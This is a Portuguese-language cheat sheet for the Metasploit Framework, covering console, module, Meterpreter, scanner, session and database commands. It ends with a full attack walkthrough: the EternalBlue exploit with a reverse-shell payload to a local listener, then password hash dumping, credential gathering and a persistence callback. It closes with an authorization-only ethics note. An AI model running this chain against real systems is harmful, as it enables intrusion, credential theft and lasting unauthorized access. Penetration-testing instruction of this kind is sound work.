# Metasploit Framework - Guia Detalhado de Comandos

## Estrutura Básica do Metasploit

### Inicialização
```bash
# Iniciar o Metasploit Console
msfconsole

# Iniciar com configurações específicas
msfconsole -q  # Modo silencioso
msfconsole -r /path/to/resource.rc  # Executar script de recursos
```

## Comandos Principais do MSFConsole

### Comandos Básicos de Navegação
```msf
help ou ?              # Mostrar ajuda geral
help <comando>         # Ajuda específica de um comando
banner                 # Mostrar banner do Metasploit
version                # Mostrar versão
history                # Histórico de comandos
exit ou quit           # Sair do Metasploit
```

### Comandos de Módulos
```msf
show exploits          # Listar todos os exploits
show payloads          # Listar todos os payloads
show auxiliary         # Listar módulos auxiliares
show encoders          # Listar encoders
show nops              # Listar NOP generators
show options           # Mostrar opções do módulo atual
show advanced          # Mostrar opções avançadas
show targets           # Mostrar alvos suportados
show missing           # Mostrar opções obrigatórias não configuradas
```

### Gerenciamento de Módulos
```msf
use <caminho/do/modulo>    # Carregar um módulo
back                       # Voltar ao contexto anterior
search <termo>             # Buscar módulos
  search type:exploit platform:windows
  search cve:2023-1234
  search name:eternalblue
info <modulo>              # Informações detalhadas do módulo
reload_all                 # Recarregar todos os módulos
```

### Configuração de Exploits
```msf
# Após usar um exploit (ex: use exploit/windows/smb/ms17_010_eternalblue)
set RHOSTS 192.168.1.100   # Definir host alvo
set RPORT 445              # Definir porta
set LHOST 192.168.1.50     # Definir IP local (para reverse shell)
set LPORT 4444             # Definir porta local
set TARGET 0               # Definir alvo específico
set PAYLOAD windows/meterpreter/reverse_tcp  # Definir payload
set VERBOSE true           # Modo verboso
set THREADS 10             # Definir número de threads
show options               # Verificar configurações
```

### Execução e Exploração
```msf
exploit ou run           # Executar o exploit
exploit -j               # Executar como job em background
exploit -z               # Executar sem interação após sucesso
check                    # Verificar se alvo é vulnerável (quando disponível)
```

## Meterpreter - Comandos Essenciais

### Comandos Básicos do Meterpreter
```meterpreter
help                     # Mostrar ajuda do Meterpreter
sysinfo                  # Informações do sistema
getuid                   # Mostrar usuário atual
getpid                   # Mostrar ID do processo
ps                       # Listar processos
kill <PID>               # Matar processo
shell                    # Obter shell do sistema
background               # Colocar sessão em background
sessions                 # Listar sessões ativas
sessions -i <ID>         # Interagir com sessão específica
exit                     # Sair do Meterpreter
```

### Comandos de Sistema de Arquivos
```meterpreter
pwd ou getwd             # Diretório atual
ls ou dir                # Listar arquivos
cd <diretório>           # Mudar diretório
cat <arquivo>            # Mostrar conteúdo do arquivo
download <remoto> <local> # Baixar arquivo
upload <local> <remoto>  # Upload de arquivo
edit <arquivo>           # Editar arquivo
rm ou del <arquivo>      # Remover arquivo
mkdir <diretório>        # Criar diretório
rmdir <diretório>        # Remover diretório
```

### Comandos de Rede
```meterpreter
ipconfig ou ifconfig     # Informações de rede
route                    # Tabela de roteamento
portfwd                  # Encaminhamento de portas
  portfwd add -l 3389 -p 3389 -r <IP_alvo>
arp                      # Tabela ARP
netstat                  # Conexões de rede
```

### Comandos de Privilégios e Persistência
```meterpreter
getsystem                # Tentar elevar privilégios
run post/windows/escalate/getsystem  # Alternativa para escalação
run post/multi/manage/shell_to_meterpreter  # Converter shell para meterpreter
run persistence -h       # Módulo de persistência
run post/windows/manage/migrate      # Migrar para outro processo
hashdump                 # Extrair hashes de senha
run post/windows/gather/credentials  # Coletar credenciais
```

## Módulos Auxiliares

### Scanners
```msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/http/http_version
```

### Coleta de Informações
```msf
use auxiliary/gather/dns_enum
use auxiliary/gather/netbios_nat_enum
use auxiliary/gather/shodan_search
```

### Testes de Vulnerabilidade
```msf
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/ssl/heartbleed
```

## Gerenciamento de Sessões

```msf
sessions                 # Listar todas as sessões
sessions -l              # Listar sessões com detalhes
sessions -i <ID>         # Interagir com sessão específica
sessions -k <ID>         # Encerrar sessão específica
sessions -K              # Encerrar todas as sessões
sessions -u <ID>         # Fazer upgrade para Meterpreter
sessions -c <comando>    # Executar comando em todas as sessões
```

## Gerenciamento de Jobs

```msf
jobs                     # Listar jobs ativos
jobs -l                  # Listar jobs com detalhes
jobs -k <ID>             # Parar job específico
jobs -K                  # Parar todos os jobs
```

## Comandos de Banco de Dados

```msf
db_status                # Verificar status do banco de dados
db_connect               # Conectar ao banco de dados
workspace                # Gerenciar workspaces
  workspace              # Listar workspaces
  workspace <nome>       # Mudar para workspace
  workspace -a <nome>    # Adicionar workspace
  workspace -d <nome>    # Remover workspace
hosts                    # Listar hosts no banco de dados
services                 # Listar serviços descobertos
vulns                    # Listar vulnerabilidades
loot                     # Listar dados coletados
notes                    # Listar notas
```

## Comandos Úteis para Desenvolvimento

```msf
check                   # Testar módulo sem explorar
reload                  # Recarregar módulo atual
edit                    # Editar módulo atual com $EDITOR
irb                     # Iniciar console Ruby interativo
resource <script.rc>    # Executar script de recursos
makerc <arquivo>        # Salvar comandos atuais em arquivo .rc
```

## Exemplo de Fluxo de Trabalho Completo

```msf
# 1. Iniciar Metasploit
msfconsole

# 2. Buscar módulo
search eternalblue

# 3. Usar exploit
use exploit/windows/smb/ms17_010_eternalblue

# 4. Configurar opções
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# 5. Verificar configurações
show options

# 6. Executar
exploit

# No Meterpreter:
# 7. Coletar informações
sysinfo
getuid

# 8. Migrar para processo estável
run post/windows/manage/migrate

# 9. Coletar hashes
hashdump

# 10. Criar persistência
run persistence -U -i 10 -p 443 -r 192.168.1.50

# 11. Colocar em background
background

# 12. Trabalhar com outras sessões
sessions -l
```

## Dicas Importantes

1. **Sempre atualize**: `sudo snap refresh metasploit-framework`
2. **Use workspaces** para organizar diferentes projetos
3. **Documente tudo** com notes no banco de dados
4. **Teste em ambiente controlado** antes de usar em produção
5. **Mantenha o sistema atualizado** com `msfupdate`

## Considerações Éticas

- Use apenas em sistemas que você possui ou tem autorização para testar
- Respeite os termos de serviço
- Obtenha autorização por escrito antes de realizar testes
- Use em ambientes controlados para aprendizado